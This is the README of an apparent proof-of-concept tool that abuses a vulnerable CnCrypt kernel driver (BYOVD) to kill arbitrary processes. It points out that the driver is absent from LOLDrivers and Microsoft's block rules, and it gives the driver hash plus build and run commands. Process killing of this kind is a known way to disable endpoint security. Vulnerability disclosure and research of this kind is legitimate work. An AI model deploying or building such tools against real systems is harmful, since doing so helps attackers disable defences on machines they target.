# CcProtect-Killer
- PoC for vulnerability in CcProtect Driver from CnCrypt

- As of 2026-02-12, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

**Driver hashes:**
- `CcProtect.sys` SHA256: `5f0cfe8357bb52b45068ddbac053e32bc38e6cb5e086746f5402657b0a5cfb1c`

> [!WARNING]
> HVCI (Core Isolation → Memory Integrity) must be disabled. The driver will BSOD the system if HVCI is enabled.

## Usage

Place `CcProtect.sys` in the same directory as the executable.

```text
PS C:\Users\User\Desktop> .\CcProtect-Killer.exe -h
BYOVD process killer using CcProtect driver

Usage: CcProtect-Killer.exe --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., notepad.exe)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p CcProtect-Killer

# Run
.\CcProtect-Killer.exe -n notepad.exe
```
